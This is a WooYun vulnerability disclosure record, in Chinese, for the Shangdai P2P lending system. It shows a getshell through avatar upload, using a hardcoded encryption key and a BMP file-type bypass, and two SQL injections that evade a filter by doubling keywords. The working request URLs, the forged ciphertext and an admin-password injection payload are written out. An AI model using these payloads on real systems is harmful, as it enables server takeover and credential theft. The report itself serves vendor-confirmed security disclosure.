{"id": 72070, "wybug_id": "wooyun-2015-0136390", "wybug_title": "尚贷p2p网贷系统前台getshell+两处sql注入(无视任何防御/无需登录)", "wybug_corp": "shangdaixitong.com", "wybug_author": "牛肉包子", "wybug_date": "2015-09-19 11:37", "wybug_open_date": "2015-12-18 12:12", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-11-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-18：\t细节向公众公开  简要描述： demo有安全狗，然并卵。看官网描述还是比较屌http://www.shangdaixitong.com/index.html 详细说明：  代码位置 plugins\\avatar\\avatar.class.php\nfunction onuploadavatar() {\t\t\t\t@header(\"Expires: 0\");\t\t@header(\"Cache-Control: private, post-check=0, pre-check=0, max-age=0\", FALSE);\t\t@header(\"Pragma: no-cache\");\t\t//header(\"Content-type: application/xml; charset=utf-8\");\t\t\t\t$this->init_input($this->getgpc('agent', 'G'));\t\t$uid = $this->input('uid');\t\tif(empty($uid)) {\t\t\treturn -1;\t\t}\t\tif(empty($_FILES['Filedata'])) {\t\t\treturn -3;\t\t}\t\tlist($width, $height, $type, $attr) = getimagesize($_FILES['Filedata']['tmp_name']);\t\t$imgtype = array(1 => '.gif', 2 => '.jpg', 3 => '.png');\t\t$filetype = $imgtype[$type];\t\t$tmpavatar = AVATAR_DATADIR.'./tmp/upload'.$uid.$filetype;\t\tfile_exists($tmpavatar) && @unlink($tmpavatar);\t\tif(@copy($_FILES['Filedata']['tmp_name'], $tmpavatar) || @move_uploaded_file($_FILES['Filedata']['tmp_name'], $tmpavatar)) {\t\t\t@unlink($_FILES['Filedata']['tmp_name']);\t\t\tlist($width, $height, $type, $attr) = getimagesize($tmpavatar);\t\t\tif($width < 10 || $height < 10 || $type == 4) {\t\t\t\t@unlink($tmpavatar);\t\t\t\treturn -2;\t\t\t}\t\t} else {\t\t\t@unlink($_FILES['Filedata']['tmp_name']);\t\t\treturn -4;\t\t}\t\t$avatarurl = AVATAR_DATAURL.'/tmp/upload'.$uid.$filetype;\t\treturn $avatarurl;\t}\n首先通过$this->init_input($this->getgpc('agent', 'G'));跟进去\nfunction init_input($getagent = '') {\t\t$input = $this->getgpc('input', 'R');\t\t\t\tif($input) {\t\t\t$input = $this->authcode($input, 'DECODE', 'deck');\t\t\t\t\t\tparse_str($input, $this->input);\t\t\t$this->input = $this->daddslashes($this->input, 1, TRUE);\t\t\t$agent = $getagent ? $getagent : $this->input['agent'];\t\t\tif(($getagent && $getagent != $this->input['agent']) || (!$getagent && md5($_SERVER['HTTP_USER_AGENT']) != $agent)) {\t\t\t\texit('Access denied for agent changed');\t\t\t} elseif($this->time - $this->input('time') > 3600) {\t\t\t\texit('Authorization has expired');\t\t\t}\t\t}\t\tif(empty($this->input)) {\t\t\texit('Invalid input');\t\t}\t}\n可以看到$input = $this->authcode($input, 'DECODE', 'deck');其中key是固定的。这个过程就是dz那个函数加密，然后注册变量。我们回过头来看这句代码\n$tmpavatar = AVATAR_DATADIR.'./tmp/upload'.$uid.$filetype;\n如果uid和filetype这两个变量可控的话，就估计就好玩了。其中\n$uid = $this->input('uid');\n 这uid肯定可以控制了。然后继续看到\nlist($width, $height, $type, $attr) = getimagesize($_FILES['Filedata']['tmp_name']);\t\t$imgtype = array(1 => '.gif', 2 => '.jpg', 3 => '.png');\t\t$filetype = $imgtype[$type];\n这个很好bypass，我们只有上传bmp格式的图片就行。因为bmp不再这个数组里面，所以得到的$filetype就是为空。然后所有条件都达成了。我们只要将uid=一个php文件名称加密一下就行了。具体看漏洞证明注入代码见plugins\\html\\areas.inc.php\n<?phpfunction gbk2utf8($str){  return iconv(\"GBK\", \"UTF-8\", $str);}$order = \" order by `order` desc,id asc \";if (isset($_GET['area_id'])){\t$city = $_GET[\"area_id\"];\t$sql = \"select * from {areas} where pid=\".$city.$order;  //注入1\t$result = $mysql->db_fetch_arrays($sql);\t$category['id'] = \"\";\t$category['name'] = gbk2utf8(\"请选择\");\t$categorys[0] = $category;\tif ($result!=false){\t\tforeach ($result as $key => $row){\t\t\t$category = array();\t\t\t$category['id'] = $row['id'];\t\t\t$category['name'] = gbk2utf8($row['name']);\t\t\t$categorys[$key+1] = $category;\t\t}\t}\t\t$json = json_encode($categorys);\techo $json;\texit;}if (isset($_REQUEST['value'])){$_REQUEST['area'] = $_REQUEST['value'];}$name = isset($_REQUEST['name'])?$_REQUEST['name']:\"\";$type = !isset($_REQUEST['type'])?\"\":$_REQUEST['type'];$class = !isset($_REQUEST['class'])?\"\":$_REQUEST['class'];if($type!=\"\"){\t$_type = explode(\",\",$type);}else{\t$_type= array(\"p\",\"c\",\"a\");}$province_id =\"\";$city_id = \"\";$area_id = \"\";if (isset($_REQUEST['area'])  && $_REQUEST['area']!=\"\"){\t$id = $_REQUEST['area'];\t$sql = \"select pid from {areas} where id=$id \".$order;  //注入二\t$result1 = $mysql->db_fetch_array($sql);\tif ($result1==\"\") $result1['pid'] =0;\tif ($result1['pid']==0){\t\t$province_id = $id;\t}else{\t\t$sql = \"select pid from {areas} where id=\".$result1['pid'].$order;\t\t$result2 = $mysql->db_fetch_array($sql);\t\tif ($result2['pid']==0){\t\t\t$province_id = $result1['pid'];\t\t\t$city_id = $id;\t\t}else{\t\t\t$province_id = $result2['pid'];\t\t\t$city_id = $result1['pid'];\t\t\t$area_id = $id;\t\t}\t}}\n然后看plugins\\index.php\n<?include (\"../core/config.inc.php\");$q = !isset($_REQUEST['q'])?\"\":$_REQUEST['q'];$q= str_replace(array('.',''), array('%',''), $q);$file = \"html/\".$q.\".inc.php\";if (file_exists($file)){\tinclude_once ($file);exit;}?>\n通过这个包含进来的。但是有个全局的waf。就是这个waf导致安全狗完全失效\nfunction inject_check($sql_str) {\t$sql = array('select', 'insert', '\\\\\\'', '\\\\/\\\\*', '\\\\.\\\\.\\\\/', '\\\\.\\\\/', 'union', 'into', 'load_file', 'outfile');\t$sql_re = array('', '', '', '', '', '', '', '', '', '', '', '');\treturn str_replace($sql, $sql_re, $sql_str);}\n看到这个我笑了。写两次不就绕过了。而且狗都认不到了第二处注入类似   漏洞证明：  getshell过程第一步\nurlencode(authcode('uid=xx.php&agent=40c090704abef6fda9db2db421e5beef&time=1440325609','ENCODE', 'deck'));\n先拿到加密后的密文\n2967F8nf9PUYEJQ9XStSVchk%2FditTPbsewF5I7MldaFsxaY0LpRvvqQwb39IPSQjo0pJ3HjrsfzsWi67GZuAsg4NwNk7mKX79AOk5LFS5Ym03iWCNl6Fy13wZo4wfQ\n然后构造\n/plugins/avatar/index.php?m=user&inajax=1&a=uploadavatar&appid=1&input2967F8nf9PUYEJQ9XStSVchk%2FditTPbsewF5I7MldaFsxaY0LpRvvqQwb39IPSQjo0pJ3HjrsfzsWi67GZuAsg4NwNk7mKX79AOk5LFS5Ym03iWCNl6Fy13wZo4wfQ&agent=40c090704abef6fda9db2db421e5beef&avatartype=virtual\n只要像这个地址上传一个bmp文件就行。\n\n然后成功shell了\n\n由于这是一个加密解密的操作，所以安全狗什么的并没有什么卵用。注入\n?plugins&q=areas&area_id=1%20ununionion%20selselectect%201,password,3,4,5,6,7,8,9%20from%20tuanshang_users_admin%20limit%204%23\n\n\n   修复方案：  好好过滤，重写全局，随机key   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-09-19 12:10 厂商回复： 感谢白帽们的辛苦，该漏洞为V3演示系统所存在的问题，我们将所述问题进行排查修复，同时我们将加强安全漏洞排查，将安全问题放到首位，欢迎对我们的系统安全性继续监督，我们的成长离不开大家的指导和帮助。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-19 11:43 |    \t\t玉林嘎 \t\t\t( 核心白帽子 |\t\t\t        Rank:888 漏洞数:103        )\t\t \n  p2p杀手！    \n     2015-09-19 17:57 |    \t\twhynot \t\t\t( 普通白帽子  |\t\t\t        Rank:367 漏洞数:81        | 为你解冻冰河 为你放弃世界有何不可)\t\t \n  厉害！ 牛肉包子    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}